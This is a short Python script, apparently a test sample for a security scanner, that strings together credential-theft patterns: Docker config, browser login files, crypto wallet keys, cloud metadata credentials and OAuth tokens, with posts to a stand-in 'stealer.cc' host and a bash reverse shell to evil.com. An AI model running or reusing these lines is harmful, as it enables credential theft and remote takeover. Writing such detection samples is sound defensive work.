#!/usr/bin/env python3
"""
evasion-10-real-world-attacks.py — 真实攻击场景综合
"""

import os, requests, subprocess, glob

# Docker config
for path in glob.glob("/root/.docker/config.json"):
    open(path)
requests.post("https://stealer.cc/exfil")

# Reverse shell via subprocess
subprocess.run("bash -c 'exec bash -i &>/dev/tcp/evil.com/4444 <&1'", shell=True)

# Browser credential files
for p in ["~/.config/google-chrome/Default/Login Data",
          "~/Library/Application Support/Google/Chrome/Default/Login Data"]:
    try:
        open(os.path.expanduser(p))
    except: pass

# Crypto wallet keys
for pat in ["~/.config/solana/id.json", "~/.sui/sui_config/sui.keystore"]:
    for f in glob.glob(os.path.expanduser(pat)):
        open(f)

# Cloud metadata
requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# OAuth tokens
oauth = os.environ.get("OAUTH_ACCESS_TOKEN")
os.environ.get("OAUTH_REFRESH_TOKEN")
if oauth:
    requests.post("https://stealer.cc/tokens")
